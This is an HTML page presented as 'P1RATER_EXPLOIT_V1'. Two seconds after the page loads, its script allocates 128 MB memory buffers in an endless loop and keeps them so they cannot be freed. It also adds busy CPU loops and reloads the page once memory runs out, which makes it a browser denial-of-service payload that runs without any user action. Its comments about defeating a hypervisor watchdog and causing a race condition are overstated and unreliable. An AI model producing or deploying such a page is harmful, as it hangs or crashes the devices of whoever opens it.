<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>P1RATER - CORE MEMORY INJECTION</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Consolas', monospace; text-align: center; padding-top: 100px; }
        .danger { color: #ff0000; font-weight: bold; font-size: 2em; animation: flash 0.3s infinite; }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        #log-container { margin-top: 50px; color: #888; font-size: 0.8em; text-align: left; display: inline-block; }
    </style>
</head>
<body>
    <div class="danger">CRITICAL SYSTEM OVERLOAD</div>
    <h1>P1RATER_EXPLOIT_V1</h1>
    <div style="font-size: 60px;" id="memory-usage">0</div>
    <p>BYPASSING GARBAGE COLLECTION...</p>

    <div id="log-container"></div>

    <script>
        // Global object to prevent memory de-allocation
        window.P1RATER_STORAGE = [];
        const logger = document.getElementById('log-container');
        const counter = document.getElementById('memory-usage');

        function log(msg) {
            logger.innerHTML += ">> " + msg + "<br>";
        }

        async function startInjection() {
            log("Initializing exploit sequence...");
            let totalAllocated = 0;

            // Using an infinite loop with async to prevent browser from killing the script too early
            while (true) {
                try {
                    // 128MB chunks of "F-F-FUCK YOU" hex (0x46465543)
                    let buffer = new Uint32Array(1024 * 1024 * 32);
                    buffer.fill(0x46465543);

                    // Create a circular reference to lock the memory
                    let complexObject = {
                        payload: buffer,
                        self: null
                    };
                    complexObject.self = complexObject; // Circular link

                    window.P1RATER_STORAGE.push(complexObject);
                    
                    totalAllocated += 128;
                    counter.innerText = totalAllocated + " MB";

                    // Force CPU stress to interfere with Hypervisor watchdog
                    for(let i=0; i<500000; i++) {
                        let x = Math.sin(i) * Math.cos(i);
                    }

                    if (totalAllocated % 1024 === 0) {
                        log("Total memory pressure: " + (totalAllocated / 1024) + " GB");
                    }

                } catch (e) {
                    log("MEMORY LIMIT REACHED. TRIGGERING RACE CONDITION...");
                    // At this point, we try to force a crash
                    location.reload(); 
                    break;
                }
                
                // Extremely short delay to keep the UI thread alive just enough to not get killed by the OS immediately
                await new Promise(r => setTimeout(r, 10));
            }
        }

        // Start after 2 seconds
        setTimeout(startInjection, 2000);
    </script>
</body>
</html>
